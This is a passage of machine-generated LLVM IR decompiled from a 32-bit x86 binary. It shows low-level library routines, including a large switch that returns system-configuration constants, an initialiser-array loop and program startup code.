  br i1 %v1_8053d28, label %dec_label_pc_8053d17, label %dec_label_pc_8053d2a

dec_label_pc_8053d2a:                             ; preds = %dec_label_pc_8053d17
  %v0_8053d2a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d2a = load i32, i32* @esp, align 4
  %v2_8053d2a = add i32 %v1_8053d2a, -4
  %v3_8053d2a = inttoptr i32 %v2_8053d2a to i32*
  store i32 %v0_8053d2a, i32* %v3_8053d2a, align 4
  %v0_8053d2b = load i32, i32* @global_var_8064b0c.376, align 4
  %v2_8053d2b = add i32 %v1_8053d2a, -8
  %v3_8053d2b = inttoptr i32 %v2_8053d2b to i32*
  store i32 %v0_8053d2b, i32* %v3_8053d2b, align 4
  %v0_8053d31 = load i32, i32* @ebx, align 4
  %v2_8053d31 = add i32 %v1_8053d2a, -12
  %v3_8053d31 = inttoptr i32 %v2_8053d31 to i32*
  store i32 %v0_8053d31, i32* %v3_8053d31, align 4
  %v5_8053d32 = add i32 %v1_8053d2a, -16
  %v6_8053d32 = inttoptr i32 %v5_8053d32 to i32*
  store i32 %arg1, i32* %v6_8053d32, align 4
  %v1_8053d35 = inttoptr i32 %v1_8053d1e to i8*
  %v2_8053d35 = call i32 @function_8054450(i8* %v1_8053d35)
  store i32 %v2_8053d35, i32* %eax.global-to-local, align 4
  %v2_8053d3d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053d3d, i32* @ebx, align 4
  ret i32 %v2_8053d35

; uselistorder directives
  uselistorder i32 %v1_8053d1d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053cec, { 1, 0 }
  uselistorder i32 %v1_8053ceb, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053cdf, { 0, 2, 1, 3 }
}

define i32 @function_8053ed0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053ed0:
  switch i32 %arg1, label %dec_label_pc_8053eef [
    i32 0, label %dec_label_pc_8053eff
    i32 1, label %dec_label_pc_8053fe4
    i32 2, label %dec_label_pc_8053f09
    i32 3, label %dec_label_pc_8053f13
    i32 4, label %dec_label_pc_8053f1d
    i32 5, label %dec_label_pc_8053fb3
    i32 6, label %dec_label_pc_8053f25
    i32 7, label %dec_label_pc_8053ee5
    i32 8, label %dec_label_pc_8053ee5
    i32 9, label %dec_label_pc_8053ee5
    i32 10, label %dec_label_pc_8053ee5
    i32 11, label %dec_label_pc_8053ee5
    i32 12, label %dec_label_pc_8053ee5
    i32 13, label %dec_label_pc_8053ee5
    i32 14, label %dec_label_pc_8053ee5
    i32 15, label %dec_label_pc_8053ee5
    i32 16, label %dec_label_pc_8053ee5
    i32 17, label %dec_label_pc_8053ee5
    i32 18, label %dec_label_pc_8053ee5
    i32 19, label %dec_label_pc_8053ee5
    i32 20, label %dec_label_pc_8053ee5
    i32 21, label %dec_label_pc_8053ee5
    i32 22, label %dec_label_pc_8053ee5
    i32 23, label %dec_label_pc_8053fe4
    i32 24, label %dec_label_pc_8053fe4
    i32 25, label %dec_label_pc_8053ff0
    i32 26, label %dec_label_pc_8053fc1
    i32 27, label %dec_label_pc_8053fe4
    i32 28, label %dec_label_pc_8053f37
    i32 29, label %dec_label_pc_8053fba
    i32 30, label %dec_label_pc_8053f2f
    i32 31, label %dec_label_pc_8053fcf
    i32 32, label %dec_label_pc_8053fe4
    i32 33, label %dec_label_pc_8053fe4
    i32 34, label %dec_label_pc_8053fe4
    i32 35, label %dec_label_pc_8053fc8
    i32 36, label %dec_label_pc_8053ff7
    i32 37, label %dec_label_pc_8053ffe
    i32 38, label %dec_label_pc_8053ff7
    i32 39, label %dec_label_pc_8053f41
    i32 40, label %dec_label_pc_8054005
    i32 41, label %dec_label_pc_8053fe4
    i32 42, label %dec_label_pc_8053fcf
    i32 43, label %dec_label_pc_8053ffe
    i32 44, label %dec_label_pc_805400c
    i32 45, label %dec_label_pc_8053ffe
    i32 46, label %dec_label_pc_8053fba
    i32 47, label %dec_label_pc_8053fba
    i32 48, label %dec_label_pc_8053fba
    i32 49, label %dec_label_pc_8053fe4
    i32 50, label %dec_label_pc_8053fe4
    i32 51, label %dec_label_pc_8053fba
    i32 52, label %dec_label_pc_8053fba
    i32 53, label %dec_label_pc_8053fe4
    i32 54, label %dec_label_pc_8053fe4
    i32 55, label %dec_label_pc_8053fe4
    i32 56, label %dec_label_pc_8053fe4
    i32 57, label %dec_label_pc_8053fe4
    i32 58, label %dec_label_pc_8053fe4
    i32 59, label %dec_label_pc_8053fe4
    i32 60, label %dec_label_pc_8053fe4
    i32 61, label %dec_label_pc_8053fe4
    i32 62, label %dec_label_pc_8053fe4
    i32 63, label %dec_label_pc_8053fe4
    i32 64, label %dec_label_pc_8053fe4
    i32 65, label %dec_label_pc_8053fe4
    i32 66, label %dec_label_pc_8053fe4
    i32 67, label %dec_label_pc_8053ee5
    i32 68, label %dec_label_pc_8053ee5
    i32 69, label %dec_label_pc_8053fc8
    i32 70, label %dec_label_pc_8053fc8
    i32 71, label %dec_label_pc_8053fc8
    i32 72, label %dec_label_pc_8053fcf
    i32 73, label %dec_label_pc_8053fd6
    i32 74, label %dec_label_pc_8053fdd
    i32 75, label %dec_label_pc_8053f4b
    i32 76, label %dec_label_pc_8053fdd
    i32 77, label %dec_label_pc_8053ee5
    i32 78, label %dec_label_pc_8053ee5
    i32 79, label %dec_label_pc_8053ee5
    i32 80, label %dec_label_pc_8053ee5
    i32 81, label %dec_label_pc_8053ee5
    i32 82, label %dec_label_pc_8053ee5
    i32 83, label %dec_label_pc_8053ee5
    i32 84, label %dec_label_pc_8053ee5
    i32 85, label %dec_label_pc_8053fe4
    i32 86, label %dec_label_pc_8053fe4
    i32 87, label %dec_label_pc_8053fc1
    i32 88, label %dec_label_pc_8053f55
    i32 89, label %dec_label_pc_8053f5f
    i32 90, label %dec_label_pc_8053fd6
    i32 91, label %dec_label_pc_8053ee5
    i32 92, label %dec_label_pc_8053ee5
    i32 93, label %dec_label_pc_8053ee5
    i32 94, label %dec_label_pc_8053ee5
    i32 95, label %dec_label_pc_8053fba
    i32 96, label %dec_label_pc_8053fe4
    i32 97, label %dec_label_pc_8053fe4
    i32 98, label %dec_label_pc_8053ee5
    i32 99, label %dec_label_pc_8053ee5
    i32 100, label %dec_label_pc_8053ee5
    i32 101, label %dec_label_pc_8053f69
    i32 102, label %dec_label_pc_8053fac
    i32 103, label %dec_label_pc_8053fe9
    i32 104, label %dec_label_pc_8053fc1
    i32 105, label %dec_label_pc_8053f73
    i32 106, label %dec_label_pc_8053fcf
    i32 107, label %dec_label_pc_8053fcf
    i32 108, label %dec_label_pc_8053fb3
    i32 109, label %dec_label_pc_8053ff0
    i32 110, label %dec_label_pc_805400c
    i32 111, label %dec_label_pc_8053fac
    i32 112, label %dec_label_pc_8053fe9
    i32 113, label %dec_label_pc_805400c
    i32 114, label %dec_label_pc_8053f7d
    i32 115, label %dec_label_pc_8054005
    i32 116, label %dec_label_pc_8053fe4
    i32 117, label %dec_label_pc_8053fe4
    i32 118, label %dec_label_pc_8053f87
    i32 119, label %dec_label_pc_8053f91
    i32 120, label %dec_label_pc_8053ffe
    i32 121, label %dec_label_pc_8053fc1
    i32 122, label %dec_label_pc_8053fc1
    i32 123, label %dec_label_pc_8053fc1
    i32 124, label %dec_label_pc_8053fc1
    i32 125, label %dec_label_pc_8053ee5
    i32 126, label %dec_label_pc_8053ee5
    i32 127, label %dec_label_pc_8053fe4
    i32 128, label %dec_label_pc_8053fe4
    i32 129, label %dec_label_pc_8053ee5
    i32 130, label %dec_label_pc_8053ee5
    i32 131, label %dec_label_pc_8053fe4
    i32 149, label %dec_label_pc_8053f98
  ]

dec_label_pc_8053ee5:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053eef:                             ; preds = %dec_label_pc_8053ed0
  %v1_8053eef = call i32 @function_8050f90(i32 ptrtoint (i32* @0 to i32))
  %v1_8053ef4 = inttoptr i32 %v1_8053eef to i32*
  store i32 22, i32* %v1_8053ef4, align 4
  br label %dec_label_pc_8053fe4

dec_label_pc_8053eff:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f09:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f13:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f1d:                             ; preds = %dec_label_pc_8053ed0
  %v0_8053f20 = call i32 @function_8050bec()
  br label %dec_label_pc_8053f25

dec_label_pc_8053f25:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053f1d
  br label %dec_label_pc_8054011

dec_label_pc_8053f2f:                             ; preds = %dec_label_pc_8053ed0
  %v0_8053f32 = call i32 @function_80544d8()
  br label %dec_label_pc_8053f37

dec_label_pc_8053f37:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053f2f
  br label %dec_label_pc_8054011

dec_label_pc_8053f41:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f4b:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f55:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f5f:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f69:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f73:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f7d:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f87:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f91:                             ; preds = %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053f98:                             ; preds = %dec_label_pc_8053ed0
  %v5_8053f9e = call i32 @function_805441c(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053fa6 = icmp slt i32 %v5_8053f9e, 0
  %v1_8053fa8 = icmp eq i1 %v2_8053fa6, false
  br i1 %v1_8053fa8, label %dec_label_pc_8053fba, label %dec_label_pc_8053fe4

dec_label_pc_8053fac:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fb3:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fba:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053f98
  br label %dec_label_pc_8054011

dec_label_pc_8053fc1:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fc8:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fcf:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fdd:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053fe4:                             ; preds = %dec_label_pc_8053f98, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053eef
  br label %dec_label_pc_8054011

dec_label_pc_8053fe9:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053ff0:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053ff7:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8053ffe:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8054005:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_805400c:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053ed0, %dec_label_pc_8053ed0
  br label %dec_label_pc_8054011

dec_label_pc_8054011:                             ; preds = %dec_label_pc_8054005, %dec_label_pc_8053ffe, %dec_label_pc_8053ff7, %dec_label_pc_8053ff0, %dec_label_pc_8053fe9, %dec_label_pc_8053fdd, %dec_label_pc_8053fd6, %dec_label_pc_8053fcf, %dec_label_pc_8053fc8, %dec_label_pc_8053fc1, %dec_label_pc_8053fb3, %dec_label_pc_8053fac, %dec_label_pc_8053fba, %dec_label_pc_8053f91, %dec_label_pc_8053f87, %dec_label_pc_8053f7d, %dec_label_pc_8053f73, %dec_label_pc_8053f69, %dec_label_pc_8053f5f, %dec_label_pc_8053f55, %dec_label_pc_8053f4b, %dec_label_pc_8053f41, %dec_label_pc_8053f37, %dec_label_pc_8053f25, %dec_label_pc_8053f13, %dec_label_pc_8053f09, %dec_label_pc_8053eff, %dec_label_pc_8053ee5, %dec_label_pc_8053fe4, %dec_label_pc_805400c
  %v0_8054014 = phi i32 [ 255, %dec_label_pc_8054005 ], [ 2048, %dec_label_pc_8053ffe ], [ 99, %dec_label_pc_8053ff7 ], [ 20, %dec_label_pc_8053ff0 ], [ -128, %dec_label_pc_8053fe9 ], [ 1024, %dec_label_pc_8053fdd ], [ 4, %dec_label_pc_8053fd6 ], [ 32, %dec_label_pc_8053fcf ], [ 256, %dec_label_pc_8053fc8 ], [ 2147483647, %dec_label_pc_8053fc1 ], [ 16, %dec_label_pc_8053fb3 ], [ 127, %dec_label_pc_8053fac ], [ 200112, %dec_label_pc_8053fba ], [ 9, %dec_label_pc_8053f91 ], [ 65535, %dec_label_pc_8053f87 ], [ -32768, %dec_label_pc_8053f7d ], [ -2147483648, %dec_label_pc_8053f73 ], [ 8, %dec_label_pc_8053f69 ], [ 500, %dec_label_pc_8053f5f ], [ 4096, %dec_label_pc_8053f55 ], [ 16384, %dec_label_pc_8053f4b ], [ 1000, %dec_label_pc_8053f41 ], [ 32768, %dec_label_pc_8053f37 ], [ 6, %dec_label_pc_8053f25 ], [ 65536, %dec_label_pc_8053f13 ], [ 100, %dec_label_pc_8053f09 ], [ 131072, %dec_label_pc_8053eff ], [ 1, %dec_label_pc_8053ee5 ], [ -1, %dec_label_pc_8053fe4 ], [ 32767, %dec_label_pc_805400c ]
  ret i32 %v0_8054014

; uselistorder directives
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 3, 5, 8, 0, 1, 2, 7 }
  uselistorder i32 ()* @function_8050bec, { 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 2, 0, 1 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 4, 1, 0, 2, 3 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 2, 0, 1 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_8054011, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8053fe4, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8053fba, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053f37, { 1, 0 }
  uselistorder label %dec_label_pc_8053f25, { 1, 0 }
}

define i32 @function_8054018() local_unnamed_addr {
dec_label_pc_8054018:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054018 = load i32, i32* @ebx, align 4
  store i32 %v0_8054018, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_805402c, label %dec_label_pc_8054039

dec_label_pc_805402c:                             ; preds = %dec_label_pc_8054018, %dec_label_pc_805402c
  %v1_80540338 = phi i32 [ %v1_8054033, %dec_label_pc_805402c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 -1), %dec_label_pc_8054018 ]
  store i32 ptrtoint (i32* @global_var_8054033.379 to i32), i32* %stack_var_-16, align 4
  %v5_805402c = mul i32 %v1_80540338, 4
  %v6_805402c = add i32 %v5_805402c, ptrtoint (i32* @global_var_805e000.378 to i32)
  %v7_805402c = inttoptr i32 %v6_805402c to i32*
  %v8_805402c = load i32, i32* %v7_805402c, align 4
  call void @__pseudo_call(i32 %v8_805402c)
  %v0_8054033.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054033 = add i32 %v0_8054033.pre, -1
  store i32 %v1_8054033, i32* %ebx.global-to-local, align 4
  %v10_8054034 = icmp eq i32 %v0_8054033.pre, 0
  %v1_8054037 = icmp eq i1 %v10_8054034, false
  br i1 %v1_8054037, label %dec_label_pc_805402c, label %dec_label_pc_8054039

dec_label_pc_8054039:                             ; preds = %dec_label_pc_805402c, %dec_label_pc_8054018
  %v0_8054039 = load i32, i32* @global_var_8064b14.380, align 4
  %v1_805403e = icmp eq i32 %v0_8054039, 0
  br i1 %v1_805403e, label %dec_label_pc_8054044, label %dec_label_pc_8054042

dec_label_pc_8054042:                             ; preds = %dec_label_pc_8054039
  %v0_8054042 = load i32, i32* %stack_var_-16, align 4
  %v1_8054042 = call i32 @unknown_0(i32 %v0_8054042)
  br label %dec_label_pc_8054044

dec_label_pc_8054044:                             ; preds = %dec_label_pc_8054042, %dec_label_pc_8054039
  %v0_8054044 = load i32, i32* @global_var_8064b18.381, align 8
  %v1_805404a = icmp eq i32 %v0_8054044, 0
  br i1 %v1_805404a, label %dec_label_pc_8054053, label %dec_label_pc_805404e

dec_label_pc_805404e:                             ; preds = %dec_label_pc_8054044
  %v2_805404e = load i32, i32* %stack_var_-16, align 4
  %v1_8054051 = call i32 @unknown_0(i32 %v2_805404e)
  br label %dec_label_pc_8054053

dec_label_pc_8054053:                             ; preds = %dec_label_pc_805404e, %dec_label_pc_8054044
  %v2_8054053 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8054053

; uselistorder directives
  uselistorder i32 %v1_8054033, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805402c, { 1, 0 }
}

define i32 @function_8054057(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054057:
  ret i32 0
}

define i32 @function_805405a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805405a:
  %v0_805405a = load i32, i32* @eax, align 4
  ret i32 %v0_805405a
}

define i32 @function_805405b() local_unnamed_addr {
dec_label_pc_805405b:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805405b = load i32, i32* @esi, align 4
  %v0_805405c = load i32, i32* @eax, align 4
  store i32 %v0_805405c, i32* @esi, align 4
  %v0_805405e = load i32, i32* @ebx, align 4
  store i32 %v0_805405e, i32* %stack_var_-8, align 4
  %v0_805405f = load i32, i32* @edx, align 4
  store i32 %v0_805405f, i32* @ebx, align 4
  %v4_8054067 = call i32 @function_8050a3c(i32 %v0_805405c, i32 1, i32 %tmp6)
  %v8_805406f = icmp eq i32 %v4_8054067, -1
  %v1_8054070 = icmp eq i1 %v8_805406f, false
  br i1 %v1_8054070, label %dec_label_pc_805408b, label %dec_label_pc_8054072

dec_label_pc_8054072:                             ; preds = %dec_label_pc_805405b
  %v0_8054074 = load i32, i32* @ebx, align 4
  %v5_805407a = call i32 @function_8050d0c(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805cfec.382, i32 0, i32 0), i32 %v0_8054074)
  %v1_8054082 = load i32, i32* @esi, align 4
  %v12_8054082 = icmp eq i32 %v5_805407a, %v1_8054082
  br i1 %v12_8054082, label %dec_label_pc_805408b, label %dec_label_pc_8054086

dec_label_pc_8054086:                             ; preds = %dec_label_pc_8054072
  %v0_8054086 = call i32 @function_8053550()
  br label %dec_label_pc_805408b

dec_label_pc_805408b:                             ; preds = %dec_label_pc_8054072, %dec_label_pc_805405b, %dec_label_pc_8054086
  %v2_805408b = load i32, i32* %stack_var_-12, align 4
  %v2_805408c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805408c, i32* @ebx, align 4
  store i32 %v0_805405b, i32* @esi, align 4
  ret i32 %v2_805408b

; uselistorder directives
  uselistorder i32 ()* @function_8053550, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805408b, { 2, 0, 1 }
}

define i32 @function_805408f() local_unnamed_addr {
dec_label_pc_805408f:
  %v0_8054092 = load i8, i8* @global_var_8064b1c.383, align 4
  %v1_8054092 = icmp eq i8 %v0_8054092, 0
  %v1_8054099 = icmp eq i1 %v1_8054092, false
  br i1 %v1_8054099, label %dec_label_pc_805408f.dec_label_pc_80540cb_crit_edge, label %dec_label_pc_805409b

dec_label_pc_805408f.dec_label_pc_80540cb_crit_edge: ; preds = %dec_label_pc_805408f
  %v0_80540ce.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80540cb

dec_label_pc_805409b:                             ; preds = %dec_label_pc_805408f
  store i8 1, i8* @global_var_8064b1c.383, align 4
  store i32 4096, i32* @global_var_8064b10.384, align 16
  %v0_80540c6 = call i32 @function_8051068()
  br label %dec_label_pc_80540cb

dec_label_pc_80540cb:                             ; preds = %dec_label_pc_805408f.dec_label_pc_80540cb_crit_edge, %dec_label_pc_805409b
  %v0_80540ce = phi i32 [ %v0_80540ce.pre, %dec_label_pc_805408f.dec_label_pc_80540cb_crit_edge ], [ %v0_80540c6, %dec_label_pc_805409b ]
  ret i32 %v0_80540ce

; uselistorder directives
  uselistorder i8* @global_var_8064b1c.383, { 1, 0 }
  uselistorder label %dec_label_pc_80540cb, { 1, 0 }
}

define i32 @function_80540cf(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80540cf:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_80540d0 = load i32, i32* @edi, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg7, i32* @global_var_8064b08.385, align 8
  store i32 %arg6, i32* @global_var_8064b18.381, align 8
  %v2_8054106 = mul i32 %arg2, 4
  %v3_8054106 = add i32 %tmp29, %v2_8054106
  %v1_8054109 = add i32 %v3_8054106, 4
  store i32 %v1_8054109, i32* @global_var_8064b0c.376, align 4
  %v3_8054112 = load i32, i32* %arg3, align 4
  %v14_8054112 = icmp eq i32 %v1_8054109, %v3_8054112
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8054118 = icmp eq i1 %v14_8054112, false
  %v4_8054118 = select i1 %v1_8054118, i32 %v1_8054109, i32 %v3_8054106
  store i32 %v4_8054118, i32* @global_var_8064b0c.376, align 4
  %v2_8054120 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054125 = bitcast i32* %stack_var_-136 to i8*
  %v4_8054125 = call i32 @function_8051e84(i8* %v3_8054125, i32 0, i32 120)
  %v0_805412a = load i32, i32* @global_var_8064b0c.376, align 4
  br label %dec_label_pc_8054132

dec_label_pc_8054132:                             ; preds = %dec_label_pc_8054132, %dec_label_pc_80540cf
